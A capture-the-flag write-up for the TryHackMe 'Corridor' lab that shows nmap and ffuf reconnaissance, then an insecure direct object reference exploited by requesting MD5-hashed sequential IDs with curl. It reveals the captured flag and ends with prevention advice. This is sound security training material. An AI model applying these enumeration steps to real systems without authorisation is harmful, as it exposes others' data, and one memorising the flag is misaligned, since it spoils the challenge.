# Corridor - Full Analysis Report

## Executive Summary

**Target:** Corridor (TryHackMe)  
**Vulnerability Identified:** Insecure Direct Object Reference (IDOR)  
**Severity:** High  
**Flag Captured:** `flag{2477ef02448ad9156661ac40a6b8862e}`  
**Time to Root:** ~30 minutes

---

## 1. Reconnaissance

### 1.1 Network Enumeration

```
nmap -T4 -sV -p- -sC -oN logNmap.txt corridor.thm
```

**Results:**
- Host: corridor.thm (10.67.168.239)
- Status: Up (0.15s latency)
- Open Ports: 80/tcp (HTTP)
- Service: Werkzeug httpd 2.0.3 (Python 3.10.2)

### 1.2 Service Analysis

**Banner Information:**
- Server: Werkzeug/2.0.3 Python/3.10.2
- Runtime: Python 3.10.2 (outdated; current: 3.13.1+)

**Security Posture:**
- Missing headers: x-content-type-options, permissions-policy, strict-transport-security, referrer-policy, content-security-policy
- No CGI directories found
- OPTIONS method allowed: HEAD, OPTIONS, GET
- X-Frame-Options header deprecated

**CVE Notes:**
- CVE-2024-42367 flagged as potential vulnerability for Werkzeug 2.0.3

---

## 2. Enumeration

### 2.1 Directory/File Enumeration

**Tool:** ffuf (faster-repeat-flag-finder)  
**Command:**
```bash
ffuf -u http://10.67.168.239/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf_results.txt
```

**Results:**
- Tested: 4,614 entries
- Found: 1 endpoint (/)
- Status: 200 OK
- Content-Type: text/html; charset=utf-8
- Content-Length: 3,213 bytes

**Conclusion:** No hidden directories or common endpoints discovered via standard wordlists.

### 2.2 Root Endpoint Analysis

**URL:** http://10.67.168.239/

**Response:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Corridor</title>
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <img src="/static/img/corridor.png" usemap="#image-map">
    <map name="image-map">
        <area target="" alt="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b" coords="257,893,258,332,325,351,325,860" shape="poly">
        <area target="" alt="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c" coords="469,766,503,747,501,405,474,394" shape="poly">
        <!-- ... 11 more areas ... -->
    </map>
</body>
</html>
```

**Key Findings:**
1. Interactive image map with 13 clickable areas
2. Each area href = MD5 hash
3. Hashes appear to be sequential/predictable
4. No visible authentication or login mechanism

### 2.3 Hash Pattern Identification

**Pattern Recognition:**

Test first hash:
```bash
echo -n "1" | md5sum
# Result: c4ca4238a0b923820dcc509a6f75849b ✓ MATCH
```

**Conclusion:** Endpoints are MD5(sequential_numbers)

**Full Pattern Confirmed:**
```
MD5("1") = c4ca4238a0b923820dcc509a6f75849b ✓
MD5("2") = c81e728d9d4c2f636f067f89cc14862c ✓
MD5("3") = eccbc87e4b5ce2fe28308fd9f2a7baf3 ✓
... (through 13)
MD5("13") = c51ce410c124a10e0db5e4b97fc2af39 ✓
```

### 2.4 Endpoint Testing

**Testing Range:** MD5(1) to MD5(13)

**Results:**
- All 13 endpoints: HTTP 200 OK
- Response size: 632 bytes each
- Content identical across all endpoints
- Response structure:
  ```html
  <!DOCTYPE html>
  <html>
  <head>...</head>
  <body>
  <style>
    body {
      background-image: url("/static/img/empty_room.jpg");
      background-size: cover;
    }
  </style>
  </body>
  </html>
  ```

**Testing Beyond Visible Range:** MD5(14) to MD5(100)
- All return: HTTP 404 Not Found

---

## 3. Vulnerability Analysis

### 3.1 Insecure Direct Object Reference (IDOR)

**Type:** Access Control Flaw  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**OWASP:** A01:2021 – Broken Access Control

### 3.2 Root Cause

1. **Predictable Identifiers:** Endpoints use sequential numbers (1-13) hashed with MD5
2. **Weak Hashing:** MD5 is trivially reversible; developers appear to assume MD5 provides "security through obscurity"
3. **No Server-Side Access Control:** Application accepts any MD5 hash in the URL without validating authorization
4. **Boundary Case Oversight:** Endpoint ID=0 exists but is not referenced in the UI image map

### 3.3 Exploitation Strategy

**Hypothesis:** If endpoints 1-13 are visible, boundary cases (0, negative, beyond 13) may contain hidden data.

**Execution:**

1. Calculate MD5("0"):
```bash
echo -n "0" | md5sum
# Result: cfcd208495d565ef66e7dff9f98764da
```

2. Test accessibility:
```bash
curl http://10.67.168.239/cfcd208495d565ef66e7dff9f98764da
# Status: 200 OK
```

3. Response size: 797 bytes (differs from 632 bytes of rooms 1-13)

4. Response content:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Corridor</title>
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <style>
        body{
            background-image: url("/static/img/empty_room.png");
            background-size: cover;
        }
        h1 {
            width: 100%;
            position: absolute;
            top: 40%;
            text-align: center;
        }
    </style>
    <h1>
        flag{2477ef02448ad9156661ac40a6b8862e}
    </h1>
</body>
</html>
```

### 3.4 Extended IDOR Testing

**Objective:** Determine if additional hidden endpoints exist

**Testing Range:** MD5(-100) to MD5(200)

**Results:**
```
MD5(-100) to MD5(-1): HTTP 404
MD5(0): HTTP 200 ✓ (FLAG)
MD5(1) to MD5(13): HTTP 200 ✓ (VISIBLE)
MD5(14) to MD5(200): HTTP 404
```

**Conclusion:** Only 14 endpoints exist: IDs 0-13

---

## 4. Exploitation Summary

### 4.1 Attack Flow

1. **Reconnaissance** → Identified HTTP service, outdated stack
2. **Enumeration** → Found 13 endpoints via HTML image map
3. **Pattern Recognition** → Identified MD5(sequential_numbers) scheme
4. **Boundary Testing** → Tested ID=0 (edge case)
5. **Success** → Endpoint 0 accessible without authentication; contains flag

### 4.2 Key Insights

| Aspect | Finding |
|--------|---------|
| **Visibility** | Room 0 not referenced in UI; intentionally hidden or oversight |
| **Size Difference** | 797 vs 632 bytes indicates unique content |
| **Background Image** | Room 0 uses .png; rooms 1-13 use .jpg (another differentiator) |
| **Content** | Flag plainly visible in HTML; no encoding/obfuscation |
| **Access Control** | None; direct URL request sufficient |
| **Authentication** | None required |
| **Rate Limiting** | None observed |

---

## 5. Technical Details

### 5.1 HTTP Responses

**Endpoint 0 (Hidden):**
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 797
Server: Werkzeug/2.0.3 Python/3.10.2
Date: Fri, 19 Jun 2026 19:22:07 GMT
```

**Endpoints 1-13 (Visible):**
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 632
Server: Werkzeug/2.0.3 Python/3.10.2
Date: Fri, 19 Jun 2026 19:22:07 GMT
```

**Endpoints 14+ (Non-existent):**
```
HTTP/1.0 404 Not Found
Content-Type: text/html; charset=utf-8
Server: Werkzeug/2.0.3 Python/3.10.2
```

### 5.2 HTTP Methods

| Method | Status | Notes |
|--------|--------|-------|
| GET | 200 | Allowed |
| HEAD | 200 | Allowed |
| OPTIONS | 200 | Allowed; returns Allow header |
| POST | 405 | Method Not Allowed |
| PUT | 405 | Method Not Allowed (implied) |
| DELETE | 405 | Method Not Allowed (implied) |

---

## 6. Captured Flag

```
flag{2477ef02448ad9156661ac40a6b8862e}
```

---

## 7. Security Assessment

### 7.1 Vulnerabilities Confirmed

1. **Insecure Direct Object Reference (IDOR)** [HIGH]
   - Severity: High
   - Exploitability: Trivial (single curl request)
   - Impact: Unauthorized information disclosure

2. **Missing Security Headers** [MEDIUM]
   - Content-Security-Policy
   - Strict-Transport-Security (HSTS)
   - X-Content-Type-Options
   - Referrer-Policy
   - Permissions-Policy

3. **Outdated Software Stack** [MEDIUM to HIGH]
   - Werkzeug 2.0.3 (latest: 2.3+)
   - Python 3.10.2 (latest: 3.13.1+)
   - Potential CVE-2024-42367

### 7.2 Vulnerabilities Not Confirmed

- **CVE-2024-42367:** Not tested; requires deeper exploitation knowledge
- **Server-Side Request Forgery (SSRF):** Not evident from enumeration
- **SQL Injection/NoSQL Injection:** No query parameters observed
- **Remote Code Execution:** No input vectors discovered

---

## 8. Methodology Notes

### 8.1 IDOR Discovery Without Scripting

IDOR enumeration can be performed manually:

1. **Identify ID Scheme**
   - Recognize predictable pattern (sequential, MD5, hashing)
   - Verify via single hash calculation: `echo -n "1" | md5sum`

2. **Test Boundary Cases**
   - Zero: `MD5("0")`
   - Negative: `MD5("-1")`
   - Beyond visible: `MD5("14")` through `MD5("100")`

3. **Manual Request**
   ```bash
   curl http://target/$(echo -n "0" | md5sum | cut -d' ' -f1)
   ```

4. **Analyze Response**
   - Status code, size, content differences

**Result:** Entire exploitation completed in <5 minutes with terminal only.

---

## 9. Lessons & Best Practices

### 9.1 Lessons Learned

1. **Boundary Testing Matters**
   - ID=0 is frequently overlooked by developers
   - Always test: 0, -1, beyond maximum visible

2. **Weak ID Schemes**
   - Hashing sequential numbers doesn't provide security
   - Predictable patterns = exploitable patterns

3. **UI Gaps Indicate Hidden Functionality**
   - Visible endpoints 1-13 in image map
   - Missing endpoint 0 = likely deliberate (or accidental)
   - Either way: testable anomaly

4. **Response Size as Reconnaissance**
   - 632 vs 797 bytes: size difference signals different content
   - Use variance as exploitation indicator

5. **Developers Often Forget Edge Cases**
   - Access control frequently breaks at boundaries
   - IDOR exploitation often exploits ID=0 or ID="admin"

### 9.2 Prevention Strategies

**For Developers:**
1. Implement server-side access control (verify user owns resource)
2. Use non-sequential, non-reversible identifiers (UUIDs, random tokens)
3. Validate all input; don't trust client-provided IDs
4. Use role-based access control (RBAC)
5. Audit access logs for unauthorized attempts
6. Test boundary conditions (0, -1, null, empty strings)

**For Testers:**
1. Always test ID=0 and ID=-1
2. Identify ID scheme (sequential, hash, UUID, etc.)
3. Test range beyond visible (14+, 100+, -1, -100)
4. Compare response sizes and structures
5. Automate with batch scripts for efficiency
6. Document findings for future reference

---

## 10. References

- **OWASP IDOR:** https://owasp.org/www-community/attacks/IDOR
- **CWE-639:** https://cwe.mitre.org/data/definitions/639.html
- **Werkzeug Docs:** https://werkzeug.palletsprojects.com/
- **OWASP Top 10 2021 - A01 Broken Access Control**
- **TryHackMe - Corridor Challenge**

---

**Report Compiled:** 2026-06-19  
**Status:** Complete  
**Difficulty Assessment:** Easy-Medium
